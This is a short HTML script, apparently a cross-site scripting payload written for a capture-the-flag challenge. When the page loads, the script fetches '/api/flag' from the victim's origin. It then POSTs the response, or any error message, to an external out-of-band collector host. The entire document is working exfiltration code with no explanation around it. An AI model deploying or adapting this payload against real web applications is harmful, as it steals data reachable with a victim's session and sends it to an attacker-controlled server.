<script>
  async function fetchFlag() {
    try {
      // Attempt to fetch internal endpoints
      const response = await fetch('/api/flag');
      const data = await response.text();

      // Send the response to your server
      fetch('https://tvszdx5dhy4imqa0ioubcq0h086zuyin.oastify.com', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ flag: data })
      });
    } catch (e) {
      // Send error message if the request fails
      fetch('https://tvszdx5dhy4imqa0ioubcq0h086zuyin.oastify.com', {
        method: 'POST',
        body: JSON.stringify({ error: e.message })
      });
    }
  }

  fetchFlag();
</script>
